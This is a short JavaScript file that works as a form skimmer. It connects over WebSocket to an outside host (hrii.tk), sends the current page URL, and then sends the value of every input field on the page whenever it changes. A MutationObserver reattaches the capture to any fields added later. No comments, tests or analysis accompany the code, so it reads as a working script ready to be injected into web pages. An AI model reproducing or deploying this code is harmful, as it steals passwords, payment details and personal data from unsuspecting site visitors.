var inlist = document.getElementsByTagName("input");
var socket;
socket = new WebSocket("wss://www.hrii.tk:8765");

socket.onopen = function(){

	socket.send("p "+window.location.href);
	return false	
};

socket.onmessage = function(e){

	console.log(e.data);
	return false;
};
socket.onclose = function(event){

    console.log('Onclose called' + event);
    console.log('code is' + event.code);
    console.log('reason is ' + event.reason);
    console.log('wasClean  is' + event.wasClean);
};


callme();
var mutationObserver = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    
	inlist = document.getElementsByTagName("input");
				
	callme();
  });
});

function callme(){
 	for(var i=0;i<inlist.length;i++){
		inlist[i].onchange = function(){
		
			console.log(this.value);
			socket.send(this.value);						
			
		};
	}
}


mutationObserver.observe(document.documentElement, {
  attributes: true,
  characterData: true,
  childList: true,
  subtree: true,
  attributeOldValue: true,
  characterDataOldValue: true
});
